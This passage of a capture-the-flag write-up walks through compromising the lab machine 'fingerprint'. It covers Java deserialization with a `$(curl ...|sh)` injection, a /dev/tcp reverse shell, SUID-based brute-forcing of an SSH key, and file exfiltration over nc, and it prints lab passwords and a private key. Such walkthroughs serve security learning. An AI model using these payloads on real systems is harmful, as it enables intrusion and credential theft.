$ echo -n 'rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAnQAQDdlZjUyYzI1MWY4MDQ0Y2IxODcwMTM5OTI4OTFkMGU1OGNlOTE5NGRlN2Y1MzViMWI0ZmE2YmJmZTA4Njc4ZjZ0ABRMV2c3Z1VSMUVtWDdVTnhzSnhxWnQAC21pY2hlYWwxMjM1' | base64 -d > object.ser
```

Now we are able to use [jdeserialize](https://code.google.com/archive/p/jdeserialize/downloads) to take a closer look at the object. Dumping the content we can see the object is an instance of a custom looking `User` class and we also get the username and password of the account we obtained access to.

```
$ java -jar jdeserialize-1.2.jar object.ser
read: com.admin.security.src.model.User _h0x7e0002 = r_0x7e0000;
//// BEGIN stream content output
com.admin.security.src.model.User _h0x7e0002 = r_0x7e0000;
//// END stream content output

//// BEGIN class declarations (excluding array classes)
class com.admin.security.src.model.User implements java.io.Serializable {
    int id;
    java.lang.String fingerprint;
    java.lang.String password;
    java.lang.String username;
}

//// END class declarations

//// BEGIN instance dump
[instance 0x7e0002: 0x7e0000/com.admin.security.src.model.User
  field data:
    0x7e0000/com.admin.security.src.model.User:
        fingerprint: r0x7e0003: [String 0x7e0003: "7ef52c251f8044cb187013992891d0e58ce9194de7f535b1b4fa6bbfe08678f6"]
        id: 2
        password: r0x7e0004: [String 0x7e0004: "LWg7gUR1EmX7UNxsJxqZ"]
        username: r0x7e0005: [String 0x7e0005: "micheal1235"]
]
//// END instance dump
```

Since everything about this seems to be quite custom we are in desperate need of source code to poke further at the deserialization. The earlier discovered `/backups` directory seems interesting for this. Fuzzing the folder for `.java` files we find `User.java` and `Profile.java`, which we download to our machine.

```
$ gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -u http://10.129.227.226:8080/backups -x java
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.227.226:8080/backups
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              java
[+] Timeout:                 10s
===============================================================
2021/12/08 20:16:46 Starting gobuster in directory enumeration mode
===============================================================
/User.java            (Status: 200) [Size: 1444]
/Profile.java         (Status: 200) [Size: 1060]
```

Both the `User.java` and `Profile.java` contain a reference to another class `UserProfileStorage` which we also find in the `/backups` directory.

`User.java`
```java
package com.admin.security.src.model;

import com.admin.security.src.utils.FileUtil;
import com.admin.security.src.utils.SerUtils;
import lombok.AllArgsConstructor;
import lombok.Data;
import lombok.NoArgsConstructor;

import javax.persistence.*;
import java.io.File;
import java.io.IOException;
import java.io.Serializable;
import java.nio.file.Paths;

// import com.admin.security.src.model.UserProfileStorage;
@AllArgsConstructor
@NoArgsConstructor
@Entity
@Data
@Table(name = "users")
public class User implements Serializable {
    private static final long serialVersionUID = -7780857363453462165L;

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    @Column(name = "id")
    protected int id;

    @Column(name = "username")
    protected String username;

    @Column(name = "password")
    protected String password;

    @Column(name = "fingerprint")
    protected String fingerprint;

    public File getProfileLocation() {
        final File dir = new File("/data/sessions/");
        dir.mkdirs();

        final String pathname = dir.getAbsolutePath() + "/" + username + ".ser";
        return Paths.get(pathname).normalize().toFile();
    }

    public boolean isAdmin() {
        return username.equals("admin");
    }

    public void updateProfile(final Profile profile) throws IOException {
        final byte[] res = SerUtils.toByteArray(profile);
        FileUtil.write(res, getProfileLocation());
    }
}
```

`Profile.java`
```java
package com.admin.security.src.model;

import com.admin.security.src.profile.UserProfileStorage;
import lombok.Data;

import java.io.File;
import java.io.IOException;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

@Data
public class Profile implements Serializable {
    private static final long serialVersionUID = 3995854114743474071L;

    private final List<String> logs;
    private final boolean adminProfile;

    private File avatar;

    public static Profile getForUser(final User user) {
        // fetch locally saved profile
        final File file = user.getProfileLocation();

        Profile profile;

        if (!file.isFile()) {
            // no file -> create empty profile
            profile = new Profile(new ArrayList<>(), user.isAdmin());
            try {
                user.updateProfile(profile);
            } catch (final IOException ignored) {
            }
        }

        // init logs etc.
        profile = new UserProfileStorage(user).readProfile();

        return profile;

    }

}
```

This file has a promising looking function `readProfile`. In this function a command is run in the terminal and the username get's simply concatenated to it. To reach the point for the possible command injection we need to first have a userprofile which is marked as admin profile. The user profile's location is also read by concatenating the username to the path so we can inject here aswell to direct it to a folder of our choosing.

`UserProfileStorage.java`
```java
package com.admin.security.src.profile;

import com.admin.security.src.model.Profile;
import com.admin.security.src.model.User;
import com.admin.security.src.utils.SerUtils;
import com.admin.security.src.utils.Terminal;
import lombok.AllArgsConstructor;
import lombok.Data;

import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Arrays;

import static com.admin.security.src.profile.Settings.AUTH_LOG;

@Data
@AllArgsConstructor
public class UserProfileStorage implements Serializable {
    private static final long serialVersionUID = -5667788713462095525L;

    private final User user;

    private void readObject(final ObjectInputStream inputStream) throws IOException, ClassNotFoundException {
        inputStream.defaultReadObject();
        readProfile();
    }

    public Profile readProfile() throws IllegalStateException {

        final File profileFile = user.getProfileLocation();

        try {
            final Path path = Paths.get(profileFile.getAbsolutePath());
            final byte[] content = Files.readAllBytes(path);

            final Profile profile = (Profile) SerUtils.from(content);
            if (profile.isAdminProfile()) { // load authentication logs only for super user
                profile.getLogs().clear();
                final String cmd = "cat " + AUTH_LOG.getAbsolutePath() + " | grep " + user.getUsername();
                profile.getLogs().addAll(Arrays.asList(Terminal.run(cmd).split("\n")));
            }
            return profile;
        } catch (final Exception e) {
            throw new IllegalStateException("Error fetching profile");
        }


    }


}
```

There are two main points we need to fullfil to achieve RCE through deserialization in this scenario.

1)  We need to have a serialized profile class saved on the target and be able to reference that directory through the user name.
2) We need a command injection payload in the username which does not interfer with the profile path.

For the first point we need to know where the upload functionality actually places the files. Sending a request to burp repeater it luckily tells us it got uploaded to `/data/uploads/`. For this to succeed we need to access this file from the `/data/sessions/` folder.

`upload response`
```
HTTP/1.1 200 OK
Server: GlassFish Server Open Source Edition  5.0.1
X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition  5.0.1  Java/Private Build/1.8)
Content-Type: text/html;charset=ISO-8859-1
Connection: close
Content-Length: 50

Successfully uploaded to /data/uploads/sm1l3z.ser
```

First we create our directory structure for the application.

```
$ mkdir -p com/admin/security/src/model
```

Next we download [lombok](https://projectlombok.org/downloads/lombok.jar) to avoid breaking dependencies. The final exploit code with the `main` function looks like this. We create an instance of the profile class with an empty array and admin set to `true`. We then serialize the instance and write it to disk to upload it. Next the program creates an instance of the User class with the command injection in the username parameter. For the command injection we pass the command inside `$()` and put everything inside a directory structure. We serialize this object aswell and write it base64 encoded to stdout.

`./Exploit.java`
```java
import java.lang.reflect.*;
import java.io.*;
import java.util.*;

import com.admin.security.src.model.User;
import com.admin.security.src.model.Profile;

public class Exploit {

    public static void main(String[] args) throws Exception {

        System.out.println("[+] Writing ser file..");

        Profile profile = new Profile(new ArrayList<>(),true);
        ByteArrayOutputStream bytestream1 = new ByteArrayOutputStream();
        ObjectOutputStream objectstream1 = new ObjectOutputStream( bytestream1 );
        objectstream1.writeObject( profile );
        objectstream1.close();
        File f =  new File("./sm1l3z.ser") ;
        ObjectOutputStream ax =  new ObjectOutputStream(new FileOutputStream(f));
        ax.writeObject( profile );

        System.out.println("[+] Serialized user var:");
        User user = new User(1,"../$(curl 10.10.14.94|sh)/../../data/uploads/sm1l3z","a","a");

        ByteArrayOutputStream bytestream2 = new ByteArrayOutputStream();
        ObjectOutputStream objectstream2 = new ObjectOutputStream( bytestream2 );
        objectstream2.writeObject( user );
        objectstream2.close();

        System.out.println(Base64.getEncoder().encodeToString(bytestream2.toByteArray()));
    }
}
```

We strip the Profile and User class of their methods since they aren't important for this scenario and it is easier to deal with dependencies this way.

`./com/admin/security/src/model/Profile.java`
```java
package com.admin.security.src.model;

import com.admin.security.src.model.User;

import lombok.Data;

import java.io.File;
import java.io.IOException;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

@Data
public class Profile implements Serializable {
    private static final long serialVersionUID = 3995854114743474071L;
    private final List<String> logs;
    private final boolean adminProfile;
    private File avatar;
}
```

`com/admin/security/src/model/User.java`
```java
package com.admin.security.src.model;

import java.io.File;
import java.io.IOException;
import java.io.Serializable;

import lombok.AllArgsConstructor;
import lombok.Data;
import lombok.NoArgsConstructor;

import java.nio.file.Paths;

@AllArgsConstructor
@NoArgsConstructor
public class User implements Serializable {
    private static final long serialVersionUID = -7780857363453462165L;
    protected int id;
    protected String username;
    protected String password ;
    protected String fingerprint;
}
```

The final directory structure before compiling looks like this.

```
$ find .
.
./com
./com/admin
./com/admin/security
./com/admin/security/src
./com/admin/security/src/model
./com/admin/security/src/model/Profile.java
./com/admin/security/src/model/User.java
./Exploit.java
./lombok.jar
```

First we compile all the source files and then add them to a `.jar`. Now we run the main function which creates our two serialized objects.

```
$ javac -d ./build -cp ./lombok.jar $(find . -name '*.java')
$ cd build/
$ jar cvf Exploit.jar $(find . -name '*.class')
added manifest
adding: com/admin/security/src/model/Profile.class(in = 2100) (out= 1050)(deflated 50%)
adding: com/admin/security/src/model/User.class(in = 566) (out= 382)(deflated 32%)
adding: Exploit.class(in = 1509) (out= 896)(deflated 40%)
$ java -cp Exploit.jar Exploit
[+] Writing ser file..
[+] Serialized user var:
rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAXQAAWFxAH4AA3QAMy4uLyQoY3VybCAxMC4xMC4xNC45NHxzaCkvLi4vLi4vZGF0YS91cGxvYWRzL3NtMWwzeg==
```

As a next step we have to generate a JWT from the base64 encoded User object. This is quickly done using python. As it turns out the JWT's are signed with the `SECRET_KEY` found in `app.py` through the LFI.

`gen_jwt.py`
```py
import jwt
from base64 import b64decode


encoded_jwt = jwt.encode({"user" : "rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAXQAAWFxAH4AA3QAMy4uLyQoY3VybCAxMC4xMC4xNC45NHxzaCkvLi4vLi4vZGF0YS91cGxvYWRzL3NtMWwzeg=="},'SjG$g5VZ(vHC;M2Xc/2~z(', algorithm='HS256')

print(encoded_jwt)
```

Running the script returns the JWT which will trigger the deserialization chain.

```
$ python gen_jwt.py
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoick8wQUJYTnlBQ0ZqYjIwdVlXUnRhVzR1YzJWamRYSnBkSGt1YzNKakxtMXZaR1ZzTGxWelpYS1VCTmR6NDErNWF3SUFCRWtBQW1sa1RBQUxabWx1WjJWeWNISnBiblIwQUJKTWFtRjJZUzlzWVc1bkwxTjBjbWx1Wnp0TUFBaHdZWE56ZDI5eVpIRUFmZ0FCVEFBSWRYTmxjbTVoYldWeEFINEFBWGh3QUFBQUFYUUFBV0Z4QUg0QUEzUUFNeTR1THlRb1kzVnliQ0F4TUM0eE1DNHhOQzQ1Tkh4emFDa3ZMaTR2TGk0dlpHRjBZUzkxY0d4dllXUnpMM050TVd3emVnPT0ifQ.RH-PghU2hafLw_eyrm1a0KEWR13URn7PMlgZBsH9pC4
```

The one thing that is left is the `index.html` which will get passed to `sh` by `curl` in our username payload. For this we can take a simple bash reverse shell.

`index.html`
```bash
#!/bin/bash

bash -c 'bash -i >&/dev/tcp/10.10.14.94/7575 0>&1'
```

Next we stand up a web server and ncat listener on the ports we specified.

```
$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
$ nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

All we have to do now is to upload the `.ser` and exchange the JWT with the one we generated.

[![110_swap_cookie](/img/fingerprint/110_swap_cookie.png)](/img/fingerprint/110_swap_cookie.png)

Upon refreshing the page we get a hit on our webserver and a shell on our listener which we upgrade using python.

```
$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.227.226 - - [09/Dec/2021 09:43:14] "GET / HTTP/1.1" 200 -
```

```
$ nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.227.226.
Ncat: Connection from 10.129.227.226:49970.
bash: cannot set terminal process group (1390): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fingerprint:/opt/glassfish5/glassfish/domains/domain1/config$ python -c 'import pty;pty.spawn("/bin/bash")'
<nfig$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@fingerprint:/opt/glassfish5/glassfish/domains/domain1/config$ export TERM=xterm
<glassfish/domains/domain1/config$ export TERM=xterm
www-data@fingerprint:/opt/glassfish5/glassfish/domains/domain1/config$ ^Z
[1]+  Stopped                 nc -lnvp 7575
$ stty raw -echo;fg
nc -lnvp 7575

www-data@fingerprint:/opt/glassfish5/glassfish/domains/domain1/config$
```

## CMATCH

Looking at interesting suid binaries as www-data we see a custom looking `cmatch` binary that is owned by john.

```
www-data@fingerprint:/$ find / -perm -4000 -ls 2>/dev/null
   394617     28 -rwsr-xr-x   1 root     root        26696 Sep 16  2020 /bin/umount
   393354     44 -rwsr-xr-x   1 root     root        44664 Mar 22  2019 /bin/su
   393287     32 -rwsr-xr-x   1 root     root        30800 Aug 11  2016 /bin/fusermount
   393338     64 -rwsr-xr-x   1 root     root        64424 Jun 28  2019 /bin/ping
   394616     44 -rwsr-xr-x   1 root     root        43088 Sep 16  2020 /bin/mount
   395381     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   395374     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
      687    100 -rwsr-xr-x   1 root     root         100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
     5033    428 -rwsr-xr-x   1 root     root         436552 Aug 11 18:02 /usr/lib/openssh/ssh-keysign
    10631    116 -rwsr-xr-x   1 root     root         117880 Jun 15 10:45 /usr/lib/snapd/snap-confine
   395567     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   394901     76 -rwsr-xr-x   1 root     root          75824 Mar 22  2019 /usr/bin/gpasswd
   395012     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newuidmap
   394808     44 -rwsr-xr-x   1 root     root          44528 Mar 22  2019 /usr/bin/chsh
   395010     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newgidmap
   394806     76 -rwsr-xr-x   1 root     root          76496 Mar 22  2019 /usr/bin/chfn
   395028     60 -rwsr-xr-x   1 root     root          59640 Mar 22  2019 /usr/bin/passwd
   393947    148 -rwsr-xr-x   1 root     root         149080 Jan 19  2021 /usr/bin/sudo
   395011     40 -rwsr-xr-x   1 root     root          40344 Mar 22  2019 /usr/bin/newgrp
   394755     52 -rwsr-sr-x   1 daemon   daemon        51464 Feb 20  2018 /usr/bin/at
    56137   2212 -rwsr-sr-x   1 john     john        2261627 Sep 26 17:31 /usr/bin/cmatch
   395189     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
   395048     24 -rwsr-xr-x   1 root     root          22520 Mar 27  2019 /usr/bin/pkexec
   264687    204 -rwsr-xr-x   1 root     root         208408 Oct 28 01:59 /opt/google/chrome/chrome-sandbox
```

Running it without arguments we see it needs more of those.

```
www-data@fingerprint:/$ cmatch
Incorrect number of arguments!
```

Running it with two arguments the error message states the first argument must be a file or directory.

```
www-data@fingerprint:/$ cmatch a b
open a: no such file or directory
```

Running it again testing it with `/etc/passwd` as file it returns 51 matches for `b` as the second argument.

```
www-data@fingerprint:/$ cmatch /etc/passwd b
Found matches: 51
```

Taking a unique string from `/etc/passwd` and running it again we see there is only one match now. So what the binary seems to do is to count matches of a string in a file.

```
www-data@fingerprint:/$ cmatch /etc/passwd systemd-resolve
Found matches: 1
```

A interesting file to read would be john's private ssh key. Checking for it witch `cmatch` it turns out the key indeed exists.

```
www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa '----BEGIN'
Found matches: 1
```

With a short script we are able to quickly bruteforce the remainder of the key. As keyspace we use the base64 alphabet with ` ` and without the `+` character which we replace with an `@` to avoid regex errors. This is based on the assumption that a valid private key should not contain a `@` character. So if we ever hit this char in our loop we have most likely reached a `+` which we in turn replace with the `.` wildcard character. After the dump is finished we just have to replace `.` with `+` again.

`brutekey.py`
```py
import subprocess
import string
import time

charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + '/'
charset += '\n,-: @'


known = '''-----BEGIN'''

while True:
    for c in charset:
        if c == '@':
            known += '.'
            break
        teststring = known + c
        result = subprocess.run(['/usr/bin/cmatch', '/home/john/.ssh/id_rsa', teststring], stdout=subprocess.PIPE).stdout.decode()
        if '1' in result:
            known += c
            print(f'current: {known}')
            break
```

We transfer the script to the target and start the bruteforce.

```
www-data@fingerprint:/tmp$ wget 10.10.14.94/brutekey.py
--2021-12-09 10:21:01--  http://10.10.14.94/brutekey.py
Connecting to 10.10.14.94:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 555 [text/x-python]
Saving to: ‘brutekey.py’

brutekey.py                                                100%[========================================================================================================================================>]     555  --.-KB/s    in 0s

2021-12-09 10:21:01 (67.8 MB/s) - ‘brutekey.py’ saved [555/555]
```

After a short amount of time we obtain the full key and only have to format it.

```
www-data@fingerprint:/tmp$ python brutekey.py
...[snip]...
current: -----BEGIN.RSA.PRIVATE.KEY-----
Proc-Type:.4,ENCRYPTED
DEK-Info:.AES-128-CBC,C310F9D86AE7CB5EA10046F9A215F423

ysiTr753RYpx1qkFJRvge/Dtu7rMEocAuCchOzAUgw9MqyPuI5M9m6KTvdB2E.SC
KI8IlmSbAAu0obdwTOuKD0QDGCMlXadI91WKkhALiLuw0JsxuviTqkjy/xQOJYu.
T4VCRI8vZoc5lfGRXnVsOJmrfTWc8f43YSD.j8dOFvdkHi0ud7xSQfqKyhDVsRyO
6qM2v5RnBJBktl7vwftG5vyk5vZjmx2u5BXTksuBrMUF2iZVtsoQ59L70CtIXP0M
g5HV4QZWRhSlS..i8W0GnWzCGANwiS18Z6CR4noSw80huaCIqWfwnoTXGJx91IDM
S79dBUPaK109.DKXZfT600JriZ8S9yvox3QuQ9KwsqTP/Iz8NqQI/J5KLoivM.t4
DHjReKktYJQ.jLB1hA3CQDYs/kVUHdG2ThluFESVrnhJDvkyvKLxNlixighsb2.c
3JHnD8OvXOxrj2jl0k/DgbsfNxf3sHAl8snIiBwgEmb8Ep6CJOIQbuaPzqa2/Lxt
FWZlHwYGnieVxX67nNdcU.3xdfXbJX8UpYuGkKGwSiZRDHb3sMN5CtfHhU0fNybG
5xHn1YTwMZwHf8dKijdevMG2a8D79oaPff0XNflP.M2oz6e8RPOmkI0Wkv9EIq9X
IbLprBGDM8VQDHtO76u.l4DQZbMFCjCSjm./xVtPmkCB7YhOyMOd5GqymGhxlbaS
OYJUBjA0TxHLtJ5.5rptyaIwnJ82CA0jjRI3hoGfk2PAkX9LJuonnRm3/Is2u02R
GoYnpegyKTp5ETL1Ut5BdEle1HrCTY5EjzI.e7bwXIEVhvgwS8e6W3ZUq72CC.gb
PkSbQSQXQDQ3/qEN0XkpFIa7gyB/GTKtlEwUSv/GxyB7lxu314/Nox7Bz32sxxsc
EwZURAAynFhVP.Bd7eB/ws/Ii2N9ENKk8ut8.9fKFw4/1pJDdwuof8MgdPImmEXZ
MPrQyMbt/7g1oAskxy3XgeuuRY76HN/p2tElyBDZ4K.XWikKAnQPNkaohfjqsTJX
VqPsWG2f8XxMnN6gRvWQ7eibbARdFU7c0KR3ANWgQ06ysCYp.R8F4ns4.nZzp2x1
DJpbS55UpW9r3cjcHHjfAoEmtI80waMKMpnTmwWyPqFGQiCVJvQkQBWKpmT/W8hU
dexiRjth.FOMmrUcFe1sSElNFHDcKj2TKxdPW97c/afLn3E/dUFDzalntY7K4A5M
O0F1a7M71yqaTsTEBglt1ZfVJUdogpz5rp2i77H5/gHV1/gIEwLwLkUchsFpS2kC
/ttPebUPv5Xxd/qMF4c8.Qaynn9.MAnbDPz7peYH2un2n103qI4PudCjdpGW23sb
UOtc0lgU4S2pA8rWT3j69nesVzR6Yni5zzj2gUL6o12.jdLoGYH6x6unlSf.EnEc
U1jQBBJReZQ82j.e1FhxvD6WclxpNrtZxZdSyYaaLOMyI618tvvn5X63AWoNAZoT
sq0H1EhWic..FzpFC1QjvmWlFIA8.KUt2BL0fz7RTQTfR0EGyZnZv9Dqe6QCneIE
U3tpTZByfgx.MI2LIM8GXjvhUOiM6
```

The formated key is however encrypted and does not seem to be easily crackable.

`john.key`
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,C310F9D86AE7CB5EA10046F9A215F423

ysiTr753RYpx1qkFJRvge/Dtu7rMEocAuCchOzAUgw9MqyPuI5M9m6KTvdB2E+SC
KI8IlmSbAAu0obdwTOuKD0QDGCMlXadI91WKkhALiLuw0JsxuviTqkjy/xQOJYu+
T4VCRI8vZoc5lfGRXnVsOJmrfTWc8f43YSD+j8dOFvdkHi0ud7xSQfqKyhDVsRyO
6qM2v5RnBJBktl7vwftG5vyk5vZjmx2u5BXTksuBrMUF2iZVtsoQ59L70CtIXP0M
g5HV4QZWRhSlS++i8W0GnWzCGANwiS18Z6CR4noSw80huaCIqWfwnoTXGJx91IDM
S79dBUPaK109+DKXZfT600JriZ8S9yvox3QuQ9KwsqTP/Iz8NqQI/J5KLoivM+t4
DHjReKktYJQ+jLB1hA3CQDYs/kVUHdG2ThluFESVrnhJDvkyvKLxNlixighsb2+c
3JHnD8OvXOxrj2jl0k/DgbsfNxf3sHAl8snIiBwgEmb8Ep6CJOIQbuaPzqa2/Lxt
FWZlHwYGnieVxX67nNdcU+3xdfXbJX8UpYuGkKGwSiZRDHb3sMN5CtfHhU0fNybG
5xHn1YTwMZwHf8dKijdevMG2a8D79oaPff0XNflP+M2oz6e8RPOmkI0Wkv9EIq9X
IbLprBGDM8VQDHtO76u+l4DQZbMFCjCSjm+/xVtPmkCB7YhOyMOd5GqymGhxlbaS
OYJUBjA0TxHLtJ5+5rptyaIwnJ82CA0jjRI3hoGfk2PAkX9LJuonnRm3/Is2u02R
GoYnpegyKTp5ETL1Ut5BdEle1HrCTY5EjzI+e7bwXIEVhvgwS8e6W3ZUq72CC+gb
PkSbQSQXQDQ3/qEN0XkpFIa7gyB/GTKtlEwUSv/GxyB7lxu314/Nox7Bz32sxxsc
EwZURAAynFhVP+Bd7eB/ws/Ii2N9ENKk8ut8+9fKFw4/1pJDdwuof8MgdPImmEXZ
MPrQyMbt/7g1oAskxy3XgeuuRY76HN/p2tElyBDZ4K+XWikKAnQPNkaohfjqsTJX
VqPsWG2f8XxMnN6gRvWQ7eibbARdFU7c0KR3ANWgQ06ysCYp+R8F4ns4+nZzp2x1
DJpbS55UpW9r3cjcHHjfAoEmtI80waMKMpnTmwWyPqFGQiCVJvQkQBWKpmT/W8hU
dexiRjth+FOMmrUcFe1sSElNFHDcKj2TKxdPW97c/afLn3E/dUFDzalntY7K4A5M
O0F1a7M71yqaTsTEBglt1ZfVJUdogpz5rp2i77H5/gHV1/gIEwLwLkUchsFpS2kC
/ttPebUPv5Xxd/qMF4c8+Qaynn9+MAnbDPz7peYH2un2n103qI4PudCjdpGW23sb
UOtc0lgU4S2pA8rWT3j69nesVzR6Yni5zzj2gUL6o12+jdLoGYH6x6unlSf+EnEc
U1jQBBJReZQ82j+e1FhxvD6WclxpNrtZxZdSyYaaLOMyI618tvvn5X63AWoNAZoT
sq0H1EhWic++FzpFC1QjvmWlFIA8+KUt2BL0fz7RTQTfR0EGyZnZv9Dqe6QCneIE
U3tpTZByfgx+MI2LIM8GXjvhUOiM6DieB2OFWsR8JRyred2qFJOjz7fX5TUl9dQv
-----END RSA PRIVATE KEY-----
```

## Mysql credentials

Looking for a place where a password could be stored we find another application inside glassfish.

```
www-data@fingerprint:/opt/glassfish5/glassfish/domains/domain1/applications$ ls
app  __internal
```

```
www-data@fingerprint:/opt/glassfish5/glassfish/domains/domain1/applications$ find __internal/ -ls
   280937      4 drwxr-x--x   3 www-data www-data     4096 Oct 24 17:02 __internal/
   287859      4 drwxr-xr-x   2 www-data www-data     4096 Oct 24 17:02 __internal/app
   281940  17996 -rw-r--r--   1 www-data www-data 18425362 Oct 24 17:01 __internal/app/app.war
```

We use ncat to transfer the file back to our machine.

```
$ nc -lnvp 7575 > app.war
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

```
www-data@fingerprint:/opt/glassfish5/glassfish/domains/domain1/applications$ nc -q 0 10.10.14.94 7575 < __internal/app/app.war
```

```
$ nc -lnvp 7575 > app.war
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.227.226.
Ncat: Connection from 10.129.227.226:36552.
```

Using [recaf](https://github.com/Col-E/Recaf) we can now take a closer look at the `war` file. A good place to start to look for credentials might be the database access. Checking for open ports we see that the default port for mysql is listening.

```
www-data@fingerprint:/$ ss -ln | grep LIST
...[snip]...
tcp  LISTEN 0      80                                     127.0.0.1:3306                                           0.0.0.0:*
...[snip]...
```

Searching `app.war` for the `mysql string`, it is used once in the `Hibernate.Util` class.

[![115_recaf_app](/img/fingerprint/115_recaf_app.png)](/img/fingerprint/115_recaf_app.png)

Looking at the class definition we find the connection password `q9Patz64fhtiVSO6Df2K`.

[![120_recaf_connection](/img/fingerprint/120_recaf_connection.png)](/img/fingerprint/120_recaf_connection.png)

Trying this password for the key we can successfully decrypt it.

```
$ openssl rsa -in john.key -out john.key.decrypt
Enter pass phrase for john.key:
writing RSA key
```

Now we are able to log into the machine as john and grab the user flag.

```
$ ssh -i john.key.decrypt john@10.129.227.226
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-163-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Dec  9 13:30:35 UTC 2021

  System load:  0.1               Processes:           178
  Usage of /:   71.2% of 6.82GB   Users logged in:     1
  Memory usage: 29%               IP address for eth0: 10.129.227.226
  Swap usage:   1%


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Dec  9 13:30:24 2021 from 10.10.14.94
john@fingerprint:~$ wc -c user.txt
33 user.txt
```

# Root

## AES ECB attack

Looking for files owned by our primary group we find an interesting looking flask app backup.

```
john@fingerprint:~$ find / -group john 2>/dev/null
...[snip]...
/var/backups/flask-app-secure.bak
john@fingerprint:~$ file /var/backups/flask-app-secure.bak
/var/backups/flask-app-secure.bak: Zip archive data, at least v1.0 to extract
```

Checking open ports there is an application listening on `0.0.0.0:8088` but seems to be blocked by firewall rules from the outside.

```
john@fingerprint:~$ ss -ln | grep LIST
...[snip]...
tcp  LISTEN 0      128                                       0.0.0.0:8088                                          0.0.0.0:*
...[snip]...
```

To take a closer look at the application running we enter the ssh console with `~C` and forward the port to us.

```
ssh> -L:8088:127.0.0.1:8088
Forwarding port.
```

At a first glance the application looks exactly the same as the application running on port 80.

[![125_new_mylog](/img/fingerprint/125_new_mylog.png)](/img/fingerprint/125_new_mylog.png)

To see if the source code is of use we scp it to our machine and open the zip.

```
$ scp -i john.key.decrypt john@10.129.227.226:/var/backups/flask-app-secure.bak .
flask-app-secure.bak													100%   72KB 714.6KB/s   00:00
```

```
$ unzip flask-app-secure.bak
Archive:  flask-app-secure.bak
   creating: flask-backup/
  inflating: flask-backup/improvements
  inflating: flask-backup/auth.py
   creating: flask-backup/static/
  inflating: flask-backup/static/eye.svg
  inflating: flask-backup/static/login.png
 extracting: flask-backup/static/admin.js
  inflating: flask-backup/static/admin.css
  inflating: flask-backup/static/trash.svg
  inflating: flask-backup/static/login.css
   creating: flask-backup/static/dist/
   creating: flask-backup/static/dist/images/
  inflating: flask-backup/static/dist/images/feature-icon-05.svg
  inflating: flask-backup/static/dist/images/feature-icon-03.svg
  inflating: flask-backup/static/dist/images/feature-icon-04.svg
  inflating: flask-backup/static/dist/images/feature-icon-06.svg
  inflating: flask-backup/static/dist/images/feature-icon-02.svg
  inflating: flask-backup/static/dist/images/feature-icon-01.svg
  inflating: flask-backup/static/dist/images/hero-top-illustration.svg
  inflating: flask-backup/static/dist/images/hero-back-illustration.svg
